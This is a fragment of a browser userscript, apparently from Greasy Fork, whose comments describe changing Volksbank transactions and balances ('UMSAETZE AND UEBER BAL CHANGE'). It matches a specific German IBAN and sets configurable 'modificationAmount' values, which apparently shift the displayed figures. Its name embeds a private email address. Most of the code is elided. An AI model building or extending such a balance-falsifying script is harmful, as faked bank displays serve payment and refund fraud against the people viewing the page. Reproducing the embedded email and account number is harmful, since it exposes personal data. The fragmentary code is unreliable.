// ==UserScript==
// @name         Ed 4Rec  ing.christiane-benedix@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/526099/Ed%204Rec%20%20ingchristiane-benedix%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/526099/Ed%204Rec%20%20ingchristiane-benedix%40t-onlinede.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
     var targetTextContent1 = "DE71 1509 1704";
    var targetTextContent2 = " 0020 6745 04";
...
(function() {
    ...
    // Configurable modification amount (positive or negative)
    const modificationAmount = 1.0; // Adjust the amount as needed
...
//    // Configurable modification amount (positive or negative)
  const modificationAmount = 2.0; // Adjust the amount as needed
